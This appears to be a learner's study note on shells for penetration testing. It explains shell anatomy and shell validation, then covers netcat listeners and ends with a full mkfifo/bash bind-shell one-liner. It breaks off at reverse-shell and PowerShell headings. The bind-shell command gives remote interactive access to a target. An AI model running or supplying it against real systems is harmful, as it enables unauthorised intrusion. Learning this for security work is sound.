SHELL BASICS 
- [x] BIND SHELL 
- [ ] REVERSE SHELL 

<u>THE ANATOMY OF A SHELL</u>
- The operating system 
- terminal emulator
- the command line/language interpreter/ shell
A command line interpreter interprets user input text through a terminal emulator in the context of a given operating system. This trio makes up a command line interface(CLI).

<u>SHELL VALIDATION in BASH</u>
- ps 
- env 

<u>SHELL VALIDATION in POWERSHELL</u>
- $PSversiontable 

BIND SHELL
The target has a listener, attacker connects 
<u>challanges</u>
- There has to be a listener already(even made by us) 
- Has to be on the internal network 
- operating system firewalls will likely block incoming traffic

WORKING WITH NETCAT
1. Start a listener
```bash
nc -lvnp 7777
```
- nc - netcat
- -l - start a listener
- v - verbose
- n - numeric ips only, no dns
- p - port
2. connect to it 
```bash
nc -nv 10.10.10.10 7777
```

ESTABLISHING A BIND SHELL
You need to specify a:
- directory 
- shell 
- listener
1. Delete any possibility of a pipe you are tryna create 
```bash
rm -f /tmp/f
```
2. Create yo pipe
```bash
mkfifo /tmp/f
```
3. Read from the pipe 
```bash
cat /tmp/f |
```
4. and pipe to shell 
```bash
/bin/bash -i 2>&1 |
```
5. give back the shell to us through netcat and loob everything back to hold session
```bash
nc -l 10.10.10.10 7777 > /tmp/f
```
so the whole thing becomes
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.10.10.10 7777 > /tmp/f
```


REVERSE SHELL 
The target acts as a client

USING POWERSHELL TO DISABLE 